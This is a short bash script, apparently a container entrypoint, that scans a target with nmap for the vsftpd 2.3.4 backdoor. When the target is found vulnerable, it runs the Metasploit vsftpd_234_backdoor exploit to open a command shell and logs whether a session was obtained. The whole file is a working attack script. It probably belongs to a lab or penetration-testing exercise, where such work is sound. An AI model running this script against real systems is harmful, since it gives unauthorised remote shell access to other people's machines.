echo "REPORT: Checking if $TARGET is vulnerable to vsftp-backdoor"
nmap --script ftp-vsftpd-backdoor $TARGET | grep 'VULNERABLE' &> /dev/null;
if [ $? == 0 ]; then
   echo "REPORT: $TARGET is vulnerable to vsftp-backdoor. Executing attack"
   echo 'exit' | msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost $TARGET; run" | grep -E 'Command shell session | Exploit completed' >> output.txt
   while read line; do
     arr=( "${arr[@]}" "$line" )
   done < output.txt

   if [[ ${arr[1]} == *"Command shell session"* ]]; then
     echo "REPORT: VSFTPD Backdoor succeeded on $TARGET"
   elif [[ ${arr[0]} == *"Exploit completed, but no session was created."* ]]; then
     echo "REPORT: VSFTPD Backdoor on $TARGET could not be exploited"
   fi
else
  echo "REPORT: $TARGET is not vulnerable to vsftp-backdoor"
fi

exec "$@"
